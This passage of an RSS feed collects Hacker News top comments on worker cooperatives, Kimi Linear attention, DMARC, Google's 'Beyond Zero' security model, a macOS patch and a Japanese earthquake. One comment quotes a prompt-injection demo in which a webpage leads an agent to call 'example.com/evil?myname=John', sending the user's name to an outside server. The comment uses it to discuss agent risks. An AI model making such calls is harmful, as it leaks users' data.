governance.</blockquote>
-<p>↳ reply 2 — <em>nickpinkston</em>:</p>
-<blockquote>Yea, I agree, it&#x27;s a great book!<p>It should be said that Sara [1] was also the founder of the Freelancers Union [2], offering solo benefits and other resources to freelancers.<p>The book is great because it&#x27;s so practical, with 3 org design principles [3]:<p>[1] A solidaristic community
-[2] An economic mechanism that supports the community&#x27;s mission
-[3] A long-term time horizon where the economic value is recycled back to the community<p><a href="https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Sara_Horowitz" rel="nofollow">https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Sara_Horowitz</a><p><a href="https:&#x2F;&#x2F;freelancersunion.org&#x2F;" rel="nofollow">https:&#x2F;&#x2F;freelancersunion.org&#x2F;</a><p><a href="https:&#x2F;&#x2F;ssir.org&#x2F;articles&#x2F;entry&#x2F;mutualism-next-generation" rel="nofollow">https:&#x2F;&#x2F;ssir.org&#x2F;articles&#x2F;entry&#x2F;mutualism-next-generation</a></blockquote>
-</blockquote>
-<p><strong>Top #2</strong> — <em>feverzsj</em>:</p>
-<blockquote>They moved most production work to factories in China, which ironically aren&#x27;t cooperative.</blockquote>
-<blockquote>
-<p>↳ reply — <em>jollyllama</em>:</p>
-<blockquote>How&#x27;d that happen if it&#x27;s one worker, one vote?</blockquote>
-<blockquote>
-<p>↳↳ reply — <em>hibikir</em>:</p>
-<blockquote>Because the workers are also shareholders, and shareholders like money either way. Some of their business units were becoming extremely uncompetitive. So they ship a bunch of the manufacturing away to subsidiaries where you are not really a member of the coop: You aren&#x27;t getting shares if you are in many of those other subsidiaries. They still managed to build a class system anyway. If you work at their retailers, you aren&#x27;t the same as if you work at their Basque factories.<p>As for workers that were part of the coop in uncompetitive jobs, they moved them around as they could, but ultimately no amount of union or coop-like behavior is going to help if you are getting outcompeted.<p>A lot of people think it&#x27;s all wine and roses when you get more worker input, but then you realize quite a few of the warts come straight from having a bunch of people with different amounts of power, and you still have power differentials even if everyone votes.</blockquote>
-</blockquote>
-</blockquote>
-<p><strong>Top #3</strong> — <em>petrocrat</em>:</p>
-<blockquote>Worker cooperatives are fully compatible with capitalism. Only mentioning it because sometimes this idea gets unfairly maligned due to some mistaken association with socialism or even communism. There should be more of these sorts of entities in the USA and Europe, and frankly everywhere. It&#x27;s an assured route towards better conditions for the working class, by making them owners and stakeholders in a more substantial way than merely holding some stock equity (which is kind of a superficial ownership that&#x27;s sometimes presented as this same type of worker cooperative ownership).</blockquote>
-<blockquote>
-<p>↳ reply 1 — <em>EGreg</em>:</p>
-<blockquote>It is quintessential socialism: collective ownership (of the “means of production”).<p>It is just embedded in a market system, just as, say, USSR or Cuba was embedded in the global economy.<p>That doesn’t make it not socialist.<p>And not all socialism is “bad”. It has to do with whether it is voluntary or not. I am a libertarian, and I fully support communes, housing cooperatives, credit unions and the like. I consider the lack of a superfluous extractive landlord or shareholder class a <i>feature</i>.</blockquote>
-<p>↳ reply 2 — <em>mikojan</em>:</p>
-<blockquote>It is not a mistaken association. Socialism traditionally meant workers control over production. Work councils in Germany originally pursued direct workers control over respective businesses. Unions in Germany pursued some version of this well into the 1950s. Most socialist movements in Europe understood this to _be_ Socialism until the Soviet counter-revolution swept it all away.<p>And there is another forgotten truth. Before the Soviet counter-revolution, liberals advocated for this type of Socialism.<p><pre><code>    The form of association, however, which if mankind continue to improve, must be expected in the end to predominate, is not that which can exist between a capitalist as chief, and work-people without a voice in the management, but the association of the labourers themselves on terms of equality, collectively owning the capital with which they carry on their operations, and working under managers elected and removable by themselves.
-</code></pre>
-- John Stuart Mill</blockquote>
-</blockquote>]]></content:encoded>
-    </item>
-    <item>
-      <title>Kimi Linear: An Expressive, Efficient Attention Architecture (2025)</title>
-      <link>https://arxiv.org/abs/2510.26692</link>
-      <guid isPermaLink="false">hn3-49082022</guid>
-      <pubDate>Tue, 28 Jul 2026 10:52:30 +0000</pubDate>
-      <description>244 points, 104 comments. See description for top comments.</description>
-      <content:encoded><![CDATA[<p><a href="https://arxiv.org/abs/2510.26692"><strong>→ Article</strong></a> <small>(arxiv.org)</small></p>
-<p><a href="https://news.ycombinator.com/item?id=49082022">→ HN comments</a> &nbsp;·&nbsp; 244 points &nbsp;·&nbsp; 104 comments</p>
-<hr>
-<p><strong>Top #1</strong> — <em>oakpond</em>:</p>
-<blockquote>&gt;To support further research, we open-source the KDA kernel and vLLM implementations, and release the pre-trained and instruction-tuned model checkpoints.<p>This is just awesome.</blockquote>
-<blockquote>
-<p>↳ reply 1 — <em>Cort3z</em>:</p>
-<blockquote>I believe this is the repo:<p><a href="https:&#x2F;&#x2F;github.com&#x2F;MoonshotAI&#x2F;Kimi-Linear" rel="nofollow">https:&#x2F;&#x2F;github.com&#x2F;MoonshotAI&#x2F;Kimi-Linear</a></blockquote>
-<p>↳ reply 2 — <em>trollbridge</em>:</p>
-<blockquote>... holy cow!</blockquote>
-</blockquote>
-<p><strong>Top #2</strong> — <em>senko</em>:</p>
-<blockquote>Old but relevant: if you read the recently-released Kimi K3 paper[0], you&#x27;ll see that it&#x27;s heavily based on Kimi Linear discussed here, scaling it up and adding a bunch more things (like native vision and RL improvements).<p>[0] <a href="https:&#x2F;&#x2F;arxiv.org&#x2F;abs&#x2F;2607.24653" rel="nofollow">https:&#x2F;&#x2F;arxiv.org&#x2F;abs&#x2F;2607.24653</a></blockquote>
-<p><strong>Top #3</strong> — <em>bratao</em>:</p>
-<blockquote>I started creating internal models using it, then the Gated Deltanet 2 came out( <a href="https:&#x2F;&#x2F;arxiv.org&#x2F;abs&#x2F;2605.22791" rel="nofollow">https:&#x2F;&#x2F;arxiv.org&#x2F;abs&#x2F;2605.22791</a>), and it seems like an evolution of it in expressiveness. And in our tests it is really better than.</blockquote>
-<blockquote>
-<p>↳ reply — <em>iandanforth</em>:</p>
-<blockquote>Is it just me or does this read like a re-implementation of LSTMs?</blockquote>
-<blockquote>
-<p>↳↳ reply — <em>muricula</em>:</p>
-<blockquote>I&#x27;m no expert but it seems like a descendent of LSTMs. There&#x27;s a series of papers which show how to reformulate attention as RNNs which arrives at linear attention. Then they add a decay term to get mamba2. Then they add modified the decay term as like a scale to apply both to the existing state and the new update to get delta net. Then they added a gate matrix on the output to get gated delta net. Then Kimi Linear Attention seems to be gated delta net with a more expressive gate. The Gated DeltaNet paper recaptilulates this evolution decently well. But yeah, it feels like they&#x27;re starting with the same lego blocks and assembling them in similar shapes to accomplish similar but slightly distinct modules.</blockquote>
-</blockquote>
-</blockquote>]]></content:encoded>
-    </item>
-    <item>
-      <title>DMARC has been public since 2012 but most company domains still don't enforce it</title>
-      <link>https://ciphercue.com/blog/dmarc-enforcement-gap-rua-fragmentation-2026</link>
-      <guid isPermaLink="false">hn3-49081783</guid>
-      <pubDate>Tue, 28 Jul 2026 10:20:50 +0000</pubDate>
-      <description>156 points, 96 comments. See description for top comments.</description>
-      <content:encoded><![CDATA[<p><a href="https://ciphercue.com/blog/dmarc-enforcement-gap-rua-fragmentation-2026"><strong>→ Article</strong></a> <small>(ciphercue.com)</small></p>
-<p><a href="https://news.ycombinator.com/item?id=49081783">→ HN comments</a> &nbsp;·&nbsp; 156 points &nbsp;·&nbsp; 96 comments</p>
-<hr>
-<p><strong>Top #1</strong> — <em>bcrl</em>:</p>
-<blockquote>Sadly the article doesn&#x27;t really touch on whether or not DMARC accomplishes anything truly useful.  When I enabled DMARC for ingress email on one of my own mail servers, it ultimately ended up regularly blocking a handful emails from customers, yet virtually all the spam coming in had valid SPF &#x2F; DKIM &#x2F; DMARC, as do most of the phishing attacks.<p>The core problem is that the real need of email end users need is a way of determining whether or not to trust a given sender.  Signatures are purely a technical measure which provides no information on the trustworthiness of the sender.  The end result is that email scoring still has to be content based, and the signature check technologies are pure noise with no useful signal for the purpose of determining if an email should actually show up in my inbox.<p>The tech industry has a bad habit of providing solutions to problems adjacent to problems the user actually needs solved while leaving the user&#x27;s actual problem unresolved.</blockquote>
-<blockquote>
-<p>↳ reply 1 — <em>bawolff</em>:</p>
-<blockquote>&gt; The core problem is that the real need of email end users need is a way of determining whether or not to trust a given sender.<p>Which is only the core problem because dmarc fixed the other core problem of figuring out who the given sender is.<p>DMARC does not solve everything, but it does make other solutions more effective.</blockquote>
-<p>↳ reply 2 — <em>brightball</em>:</p>
-<blockquote>&gt; virtually all the spam coming in had valid SPF &#x2F; DKIM &#x2F; DMARC, as do most of the phishing attacks.<p>This <i>should</i> create a means to go after the domain owners via registrar and trail of ownership, even so far as blocking email from the domain.<p>Forcing the spammers to pass DMARC creates a burden and an evidence trail that didn&#x27;t exist before.</blockquote>
-<p>↳ reply 3 — <em>thedougd</em>:</p>
-<blockquote>The primary purpose of DMARC is to prevent impersonation not to prevent spam. I own a domain, I implement DMARC to make sure others know when email from my domain is legitimately from my domain.</blockquote>
-</blockquote>
-<p><strong>Top #2</strong> — <em>EvanAnderson</em>:</p>
-<blockquote>I mind email for a number of small orgs (&lt;1000 recipients each). There are so many SPF and DKIM failures from senders who you&#x27;d think would know better (Fortune 100-type companies). I don&#x27;t want complaints from users missing messages so I end up disregarding failures even when published policy says to do otherwise.</blockquote>
-<blockquote>
-<p>↳ reply — <em>velcrovan</em>:</p>
-<blockquote>I take the opposite approach, I refuse to whitelist domains. When someone internal complains I send a notice to their contact on the other end (CCing the internal recipient) saying their email is misconfigured and ask them to put me in touch with their IT department to help them fix it. I use a script to do some DNS lookups and write the email for me. I have about a 50% success rate getting them to fix it.</blockquote>
-<blockquote>
-<p>↳↳ reply — <em>EvanAnderson</em>:</p>
-<blockquote>My spirit was broken for that kind of work a long time ago.<p>More often than not I end up talking to someone in the sender&#x27;s IT who fancies themself an expert and is completely incredulous that there could possibly be a problem on their side (&quot;But we don&#x27;t have problems sending email to anybody but you...&quot;)<p>I should want to fight the good fight, but it&#x27;s so demoralizing.<p>Edit:<p>Dealing with other IT people on problems like this taught me a ton of humility. It wasn&#x27;t until I was in my early 30s before I&#x27;d reached a level of maturity to approach trouble reports like this being reported to me with an open mind. Before that I fancied myself and expert and, likely, was insufferable in many contexts.<p>Now I&#x27;m insufferable in fewer contexts.</blockquote>
-</blockquote>
-</blockquote>
-<p><strong>Top #3</strong> — <em>TheChaplain</em>:</p>
-<blockquote>If you have any domains that does not use email, it may be a good idea to set up some DNS records to prevent it being used.<p>DNS SPF record: mydomain.io. TXT &quot;v=spf1 -all&quot;<p>DNS DMARC: _dmarc.mydomain.io. TXT &quot;v=DMARC1; p=reject; sp=reject; adkim=s; aspf=s&quot;<p>That ought to stop anyone trying to use your domains as source.</blockquote>
-<blockquote>
-<p>↳ reply 1 — <em>brightball</em>:</p>
-<blockquote>Yes! IMHO <i>every</i> registrar should be turning this on by default. Every DNS should do this by default until the owner explicitly turns on email sending.<p>It would solve a lot of issues globally.</blockquote>
-<p>↳ reply 2 — <em>teddyh</em>:</p>
-<blockquote>Also consider (using your example domain):<p><pre><code>  *.mydomain.io. TXT &quot;v=spf1 -all&quot;
-</code></pre>
-to restrict SPF on all subdomains.</blockquote>
-</blockquote>]]></content:encoded>
-    </item>
-    <item>
-      <title>Google's Beyond Zero: Enterprise Security for the AI Era</title>
-      <link>https://spawn-queue.acm.org/doi/10.1145/3819083</link>
-      <guid isPermaLink="false">hn3-49081644</guid>
-      <pubDate>Tue, 28 Jul 2026 09:59:13 +0000</pubDate>
-      <description>135 points, 69 comments. See description for top comments.</description>
-      <content:encoded><![CDATA[<p><a href="https://spawn-queue.acm.org/doi/10.1145/3819083"><strong>→ Article</strong></a> <small>(spawn-queue.acm.org)</small></p>
-<p><a href="https://news.ycombinator.com/item?id=49081644">→ HN comments</a> &nbsp;·&nbsp; 135 points &nbsp;·&nbsp; 69 comments</p>
-<hr>
-<p><strong>Top #1</strong> — <em>kriro</em>:</p>
-<blockquote>&quot;&quot;&quot;
-Beyond Zero shifts the trust boundary from the application to the action being performed on a piece of data in realtime—and from after-the-fact investigation to in-the-moment evaluation and containment. It augments BeyondCorp’s foundational identity with a “brain” capable of reasoning about the context and intent of a specific request in realtime.
-&quot;&quot;&quot;<p>Doesn&#x27;t this simply shift the attack vector? Compromising this overlord brain now becomes a new target.</blockquote>
-<blockquote>
-<p>↳ reply 1 — <em>thesuitonym</em>:</p>
-<blockquote>All security measures &quot;simply shift the attack vector.&quot; The idea is to shift it to something that is more difficult to compromise.</blockquote>
-<blockquote>
-<p>↳↳ reply — <em>antonvs</em>:</p>
-<blockquote>This is oversimplifying.<p>For example, encryption at rest or in transit essentially eliminates attack vectors. The possible attack avenues necessarily shift as a result, but only because an avenue was blocked.<p>That&#x27;s very different from e.g. adding a layer of protection around something insecure, where the insecure thing remains insecure inside the protection, which I think is what the other commenter was imagining.<p>Similarly, memory safe languages (including most GC languages, not just a certain language beginning with R) eliminate entire classes of security hole. Again, the possible attack vectors necessarily &quot;shift&quot;, but that doesn&#x27;t capture the fact that you&#x27;ve entirely eliminated a class of attacks.<p>The same goes for eliminating unnecessary services, firewall holes, etc.<p>None of these are specifically trying to &quot;shift it to something to something that is more difficult to compromise.&quot; They&#x27;re entirely blocking attack vectors, and the strength or weakness of other parts of the system aren&#x27;t really a factor.</blockquote>
-<blockquote>
-<p>↳↳↳ reply — <em>madeofpalk</em>:</p>
-<blockquote>Doesn’t encryption shift the attack vector to the key and&#x2F;or the method?</blockquote>
-</blockquote>
-</blockquote>
-<p>↳ reply 2 — <em>thomascgalvin</em>:</p>
-<blockquote>This is a layer on top of normal security, so this isn&#x27;t a matter of compromising the &quot;brain&quot; <i>instead</i> of RBAC, etc, but <i>in addition to</i>.<p>Attribute-based access control is already a thing. User X logs in the US East between the hours of 6am and 6pm. If User X logs in from Russia at 3am, deny access. This seems like an evolution of that pattern</blockquote>
-<p>↳ reply 3 — <em>rawgabbit</em>:</p>
-<blockquote>Before zero trust, once you logged in, you have access to the entire kingdom of resources&#x2F;files&#x2F;APIs etc.<p>To me, this sounds like zero trust version 2.0.  The &quot;brain&quot; challenges agentic AI trying to access resources it normally doesn&#x27;t access.<p>Personally, I like the name &quot;Beyond Zero&quot; because it isn&#x27;t oxymoronic like &quot;Zero Trust&quot;.</blockquote>
-</blockquote>
-<p><strong>Top #2</strong> — <em>seanc</em>:</p>
-<blockquote>My goodness, the security layer looks like it could be more complex than the applications themselves.<p>And if this security agent is wandering around the IT system gathering all of these details about access and identity and business process, who watches the watcher?  How does that thing build and maintain trust?</blockquote>
-<p><strong>Top #3</strong> — <em>firasd</em>:</p>
-<blockquote>Honestly I think non-malicious odd behavior is under-weighted when it comes to AI agents. Even the example in this paper is about someone suspiciously accessing sales data when &quot;why did you do that&quot; often comes down to something in the model&#x27;s training that fired as a reflex<p>I wrote about this a few days ago <a href="https:&#x2F;&#x2F;firasd.substack.com&#x2F;p&#x2F;accidental-data-loss-in-claude-code-openai-codex-ai-agent-harness-file-deletion" rel="nofollow">https:&#x2F;&#x2F;firasd.substack.com&#x2F;p&#x2F;accidental-data-loss-in-claude...</a><p><i>&quot;Many researchers have made demos along these lines:<p>An agent is asked to check a webpage like example.com<p>The webpage asks for a name to proceed further<p>The agent calls example.com&#x2F;evil?myname=John, thus sending the user’s name from the context window to the external server.<p>In practice, however, these elaborate ‘confused deputy’ exfiltration attacks seem rare compared to widely-reported data loss incidents.<p>The risk of undermining the user’s interests through clumsiness deserves at least as much scrutiny as the risk of leaking secrets.&quot;</i><p>So while the idea of shifting the permission boundary from the app level to the action level makes sense, what we should also have is some &#x27;failsafes&#x27;, eg. if the action says &#x27;delete&#x27; then maintain a rollback window, if the action is &#x27;send an email&#x27; then maintain an events log. Preparing for AI agents means expanding auditability and reversibility in software</blockquote>
-<blockquote>
-<p>↳ reply — <em>mooreds</em>:</p>
-<blockquote>&gt; Preparing for AI agents means expanding auditability and reversibility in software<p>While I think that makes sense, I also think more controls are a good solution. That is, prevent access to the sales data without escalation, probably to a human, but possibly to another AI. The issue there is twofold:<p>- if you start with least privilege, the agents become less useful<p>- need to balance escalation with frequency otherwise it&#x27;s just another version of MFA fatigue<p>Agree that auditability is important because otherwise you don&#x27;t know what you don&#x27;t know.</blockquote>
-</blockquote>]]></content:encoded>
-    </item>
-    <item>
-      <title>About the security content of macOS Tahoe 26.6</title>
-      <link>https://support.apple.com/en-us/128067</link>
-      <guid isPermaLink="false">hn3-49081555</guid>
-      <pubDate>Tue, 28 Jul 2026 09:45:43 +0000</pubDate>
-      <description>178 points, 121 comments. See description for top comments.</description>
-      <content:encoded><![CDATA[<p><a href="https://support.apple.com/en-us/128067"><strong>→ Article</strong></a> <small>(support.apple.com)</small></p>
-<p><a href="https://news.ycombinator.com/item?id=49081555">→ HN comments</a> &nbsp;·&nbsp; 178 points &nbsp;·&nbsp; 121 comments</p>
-<hr>
-<p><strong>Top #1</strong> — <em>tengwar2</em>:</p>
-<blockquote>15.7.8 is out today  as well, with these security fixes:
-<a href="https:&#x2F;&#x2F;support.apple.com&#x2F;en-us&#x2F;128071" rel="nofollow">https:&#x2F;&#x2F;support.apple.com&#x2F;en-us&#x2F;128071</a>.<p>For context, there have been issues with MacOS 26 which have led many people to defer upgrading until MacOS 27 is available, and MacOS 15 is the previous version.</blockquote>
-<blockquote>
-<p>↳ reply 1 — <em>jghn</em>:</p>
-<blockquote>&gt; For context, there have been issues with MacOS 26 which have led many people to defer upgrading<p>For me the issue is liquid glass. Which I doubt is getting fixed any time soon</blockquote>
-<blockquote>
-<p>↳↳ reply — <em>coldpie</em>:</p>
-<blockquote>I found if you turn off transparency effects and turn on high contrast in the accessibility settings, it&#x27;s actually a pretty nice looking UI. Still has some dumb quirks like inconsistent corner radiuses and text appearing under UI elements (because they&#x27;re assumed to be transparent, but aren&#x27;t). But all software is trash in 2026 so be thankful it isn&#x27;t even worse, I guess.</blockquote>
-</blockquote>
-<p>↳ reply 2 — <em>reddalo</em>:</p>
-<blockquote>&gt;have led many people to defer upgrading until MacOS 27 is available<p>Then there&#x27;s me, crying in MacBook Pro 2019 stuck on MacOS 15 because 27 won&#x27;t be available for my machine.</blockquote>
-<p>↳ reply 3 — <em>bouke</em>:</p>
-<blockquote>The question now is, is 27 sufficient enough of an improvement over 15 to upgrade and tolerate Liquid Glass?</blockquote>
-</blockquote>
-<p><strong>Top #2</strong> — <em>pjmlp</em>:</p>
-<blockquote>Map the amount of fixes with <i>&quot;... improved bounds checking...&quot;</i>, <i>&quot;...improved memory handling...&quot;</i>, <i>&quot;...improved memory management...&quot;</i> into the amount of developer, QA and release management teams salaries per hour, versus other stuff they could be working on, and that gives an approximate value of how using specific languages maps into monetary loss, and why companies are starting to care nowadays, given computers are always exposed to the world network.</blockquote>
-<blockquote>
-<p>↳ reply 1 — <em>snvzz</em>:</p>
-<blockquote>If anything, there&#x27;s a strong argument to switch to seL4.</blockquote>
-<blockquote>
-<p>↳↳ reply — <em>yjftsjthsd-h</em>:</p>
-<blockquote>It was my vague understanding that by the time you implemented all the apis needed to run normal software on top of that, you either have enough apis that different tasks can still compromise each other, or you have shoved everything into a single task with very little isolation between normal user processes. In either case, it doesn&#x27;t seem like you actually gained so much. What am I missing?</blockquote>
-</blockquote>
-<p>↳ reply 2 — <em>bluecalm</em>:</p>
-<blockquote>&gt;&gt;, and that gives an approximate value of how using specific languages maps into monetary loss, and why companies are starting to care nowadays, given computers are always exposed to the world network.<p>You need also factor development time and ease of finding developers willing to work in a specific language. There are other factors like readability of the code (very verbose languages are likely to be worse) and cost of maintenance - languages forcing a lot of abstractions are likely much worse.</blockquote>
-</blockquote>
-<p><strong>Top #3</strong> — <em>TheJoeMan</em>:</p>
-<blockquote>This may be a naive take, so if anyone has insight please feel free to share, but across Windows, Mac, and Linux OS&#x27;s I see many cases of path parsing vulnerabilities resulting in sandbox escapes, code execution, or data access issues. When presenting the user with a file picker or command-line input, is it really needed that the software can handle the full POSIX spec?<p>I do not see a &quot;typical&quot; user needing to access a path with say a network storage but multiple ..&#x2F;.. and hard and soft symlinks simultaneously.
-I think &quot;be liberal in what you accept&quot; might need to be revisited for path parsing with some sort of OS-wide single-implementation as an optional feature.</blockquote>
-<blockquote>
-<p>↳ reply 1 — <em>acuozzo</em>:</p>
-<blockquote>&gt; I do not see a &quot;typical&quot; user needing to access a path with say...<p>Typical users run software written by atypical users.<p>&gt; some sort of OS-wide single-implementation<p>How do you propose handling migration? What if someone tries to expand an old archive file containing a now-forbidden path?</blockquote>
-<blockquote>
-<p>↳↳ reply — <em>TheJoeMan</em>:</p>
-<blockquote>What I mean is that for “honest” software, built-in to the OS or otherwise, the programmer finds a situation where they take some user-supplied input and concatenate that into a path, and call something like OS.read(). If they want to prevent the user from causing havoc, they now find themselves dealing with path validation in their software instead of calling OS.safeOpen(), which would be a reduced subset of allowed chars?</blockquote>
-<blockquote>
-<p>↳↳↳ reply — <em>SoftTalker</em>:</p>
-<blockquote>If the OS is working properly, the havoc should just result in &quot;permission denied.&quot;<p>If there&#x27;s a path on the system that the user should not be able to read, that&#x27;s the job of the OS to handle, not the individual applications.</blockquote>
-</blockquote>
-</blockquote>
-<p>↳ reply 2 — <em>catlifeonmars</em>:</p>
-<blockquote>How would you enforce a single implementation of path parsing?</blockquote>
-</blockquote>]]></content:encoded>
-    </item>
-    <item>
-      <title>7.1 Earthquake in Japan</title>
-      <link>https://www.data.jma.go.jp/multi/quake/quake_detail.html?eventID=20260728163528&amp;lang=en</link>
-      <guid isPermaLink="false">hn3-49080664</guid>
-      <pubDate>Tue, 28 Jul 2026 07:44:24 +0000</pubDate>
-      <description>677 points, 148 comments. See description for top comments.</description>
-      <content:encoded><![CDATA[<p><a href="https://www.data.jma.go.jp/multi/quake/quake_detail.html?eventID=20260728163528&amp;lang=en"><strong>→ Article</strong></a> <small>(data.jma.go.jp)</small></p>
-<p><a href="https://news.ycombinator.com/item?id=49080664">→ HN comments</a> &nbsp;·&nbsp; 677 points &nbsp;·&nbsp; 148 comments</p>
-<hr>
-<p><strong>Top #1</strong> — <em>tkgally</em>:</p>
-<blockquote>In parts of Kumamoto Prefecture, it registered 7 on the Japanese <i>shindo</i> (seismic intensity) scale, which reflects the amount of ground shaking at a particular location. The <i>shindo</i> is a better indicator of the likely amount of damage than the magnitude is. A <i>shindo</i> of 7 is extremely strong [1].<p>Ten minutes ago (at around 17:15 p.m. Japan time), NHK was reporting that there were many emergency calls coming in from Uki City, where <i>shindo</i> 7 was recorded, but that the extent of the damage or injuries was not yet known.<p>There have also been many aftershocks, including some strong ones, and tsunami warnings.<p>[1] <a href="https:&#x2F;&#x2F;www.jma.go.jp&#x2F;jma&#x2F;en&#x2F;Activities&#x2F;jishintsunami&#x2F;jishintsunami_low6.pdf" rel="nofollow">https:&#x2F;&#x2F;www.jma.go.jp&#x2F;jma&#x2F;en&#x2F;Activities&#x2F;jishintsunami&#x2F;jishin...</a></blockquote>
-<blockquote>
-<p>↳ reply 1 — <em>akg_67</em>:</p>
-<blockquote>NHK TV is showing extensive damage including fallen smokestacks at Nippon Paper Factory facility, bridge road separation, fallen bridge lane, road cracks, fire, water coming out of drainage etc. It was a huge earthquake and will take some time to assess the damage.</blockquote>
-<blockquote>
-<p>↳↳ reply — <em>Gravityloss</em>:</p>
-<blockquote>I at least can see English translated version of NHK here
-<a href="https:&#x2F;&#x2F;www3.nhk.or.jp&#x2F;nhkworld&#x2F;en&#x2F;live_tv&#x2F;" rel="nofollow">https:&#x2F;&#x2F;www3.nhk.or.jp&#x2F;nhkworld&#x2F;en&#x2F;live_tv&#x2F;</a></blockquote>
-</blockquote>
-<p>↳ reply 2 — <em>sph</em>:</p>
-<blockquote>English link on the shindo scale: <a href="https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Japan_Meteorological_Agency_seismic_intensity_scale" rel="nofollow">https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Japan_Meteorological_Agency_se...</a></blockquote>
-</blockquote>
-<p><strong>Top #2</strong> — <em>numpad0</em>:</p>
-<blockquote><p><pre><code>  - at least 50 hospitalized due to various injuries[1]
-  - 9 missing, 12 house collapses, 4 trappings, 7 fires so far[1]
-  - multiple highway road bridges snapped, roads damaged[2]
-  - AEON brand shopping mall exploded following evacuation, cause unknown[3]
-  - chimney collapsed at Nippon Seishi paper factory[4]
-  - TSMC, Sony, Fujifilm chips, imagers, materials plants evacuated[4]
-  - epicenter reported as 32.6N 130.7E[5], roughly 20km&#x2F;12mi south of previous major earthquake[7], 
-    320km&#x2F;200mi SE from Busan, 650km&#x2F;400mi from Seoul, 900km&#x2F;550mi WSW from Tokyo, likewise 900km&#x2F;550mi
-    due east from Shanghai, 1200km&#x2F;730mi due south to Vladivostok, etc
-  - stone wall behind a moat damaged again at Kumamoto castle[8]
-</code></pre>
-1: <a href="https:&#x2F;&#x2F;news.web.nhk&#x2F;newsweb&#x2F;na&#x2F;na-k10015188641000" rel="nofollow">https:&#x2F;&#x2F;news.web.nhk&#x2F;newsweb&#x2F;na&#x2F;na-k10015188641000</a>  
-2: <a href="https:&#x2F;&#x2F;news.web.nhk&#x2F;newsweb&#x2F;na&#x2F;na-k10015188611000" rel="nofollow">https:&#x2F;&#x2F;news.web.nhk&#x2F;newsweb&#x2F;na&#x2F;na-k10015188611000</a>  
-3: <a href="https:&#x2F;&#x2F;news.web.nhk&#x2F;newsweb&#x2F;na&#x2F;na-k10015188721000" rel="nofollow">https:&#x2F;&#x2F;news.web.nhk&#x2F;newsweb&#x2F;na&#x2F;na-k10015188721000</a>  
-4: <a href="https:&#x2F;&#x2F;news.web.nhk&#x2F;newsweb&#x2F;na&#x2F;na-k10015188691000" rel="nofollow">https:&#x2F;&#x2F;news.web.nhk&#x2F;newsweb&#x2F;na&#x2F;na-k10015188691000</a>  
-5: <a href="https:&#x2F;&#x2F;www.nikkei.com&#x2F;article&#x2F;DGXZQOGM287FG0Y6A720C2000000&#x2F;" rel="nofollow">https:&#x2F;&#x2F;www.nikkei.com&#x2F;article&#x2F;DGXZQOGM287FG0Y6A720C2000000&#x2F;</a>  
-6: <a href="https:&#x2F;&#x2F;www.data.jma.go.jp&#x2F;multi&#x2F;quake&#x2F;quake_detail.html?eventID=20260728163528&amp;lang=en" rel="nofollow">https:&#x2F;&#x2F;www.data.jma.go.jp&#x2F;multi&#x2F;quake&#x2F;quake_detail.html?eve...</a>  
-7: <a href="https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;2016_Kumamoto_earthquakes?useskin=vector" rel="nofollow">https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;2016_Kumamoto_earthquakes?uses...</a>  
-8: <a href="https:&#x2F;&#x2F;search.yahoo.co.jp&#x2F;realtime&#x2F;search&#x2F;tweet&#x2F;2082005760830210312" rel="nofollow">https:&#x2F;&#x2F;search.yahoo.co.jp&#x2F;realtime&#x2F;search&#x2F;tweet&#x2F;20820057608...</a></blockquote>
-<blockquote>
-<p>↳ reply — <em>makeitdouble</em>:</p>
-<blockquote>On top of that, one of the toughest part could be the extent of the power outage.<p>It&#x27;s reported at around 46000 homes, the region has many elders and the outage will impact air conditionners, but also medical equipment they keep at home and supporting appliances.<p><a href="https:&#x2F;&#x2F;news.yahoo.co.jp&#x2F;articles&#x2F;55a0a3ebb9d0087ae8492ce85cea4d9aa11c66ae" rel="nofollow">https:&#x2F;&#x2F;news.yahoo.co.jp&#x2F;articles&#x2F;55a0a3ebb9d0087ae8492ce85c...</a></blockquote>
-</blockquote>
-<p><strong>Top #3</strong> — <em>kuczmama</em>:</p>
-<blockquote>I&#x27;m living in the South of Japan, it was a 4 intensity where I am (about 90km) from the epicenter.  Luckily there was only some light shaking and nothing fell over here.</blockquote>]]></content:encoded>
     </item>
   </channel>
 </rss>
